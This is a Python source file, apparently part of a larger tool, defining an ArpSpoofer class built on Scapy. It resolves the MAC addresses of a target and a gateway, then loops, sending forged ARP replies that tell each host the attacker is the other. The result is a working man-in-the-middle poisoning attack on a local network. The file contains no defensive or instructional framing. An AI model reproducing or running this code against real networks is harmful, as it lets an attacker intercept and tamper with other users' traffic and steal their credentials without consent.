# core/arp_spoofer.py

from scapy.all import ARP, Ether, srp, send
import time

class ArpSpoofer:
    def __init__(self, target_ip, gateway_ip, iface):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.iface = iface
        self.running = False

    def get_mac(self, ip):
        try:
            pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            ans, _ = srp(pkt, timeout=2, iface=self.iface, verbose=False)
            for _, rcv in ans:
                return rcv.hwsrc
        except Exception as e:
            print(f"[!] Error resolving MAC for {ip}: {e}")
        return None

    def spoof(self):
        target_mac = self.get_mac(self.target_ip)
        gateway_mac = self.get_mac(self.gateway_ip)

        if not target_mac or not gateway_mac:
            print(f"[!] Could not find MACs for {self.target_ip} or gateway {self.gateway_ip}")
            return

        self.running = True
        print(f"[+] ARP poisoning started: {self.target_ip} <-> {self.gateway_ip}")

        try:
            while self.running:
                # Tell the target that we are the gateway
                send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip, hwdst=target_mac), verbose=False)
                # Tell the gateway that we are the target
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip, hwdst=gateway_mac), verbose=False)
                time.sleep(2)
        except Exception as e:
            print(f"[!] Error during spoofing thread for {self.target_ip}: {e}")

    def stop(self):
        self.running = False
        print(f"[-] Stopped spoofing {self.target_ip}")
